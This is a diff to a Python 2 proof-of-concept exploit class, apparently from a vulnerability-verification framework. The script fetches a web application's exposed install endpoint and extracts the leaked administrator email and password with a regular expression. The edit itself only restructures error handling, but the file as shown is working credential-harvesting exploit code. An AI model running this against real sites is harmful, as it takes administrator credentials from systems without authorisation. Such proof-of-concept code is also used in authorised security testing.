@@ -44,13 +44,7 @@ class MyPoc(BaseFrame):
         verify_url = args['options']['target'] + '/index.php/install/do_install'
         if args['options']['verbose']:
             print '[*] Request URL: ' + verify_url
-        try:
-            content = urllib2.urlopen(urllib2.Request(verify_url)).read()
-        except Exception, e:
-            content = ''
-            args['success'] = False
-            return args
-
+        content = urllib2.urlopen(urllib2.Request(verify_url)).read()
         if content:
             regular = re.findall('Your Email:\s+<b>(.*?)</b><br/>\s+Password:\s+<b>(.*?)</b>', content)
             if regular:
@@ -60,9 +54,8 @@ class MyPoc(BaseFrame):
                 args['poc_ret']['Username'] = username
                 args['poc_ret']['Password'] = password
                 return args
-            else:
-                args['success'] = False
-                return args
+        args['success'] = False
+        return args
 
     exploit = verify
 
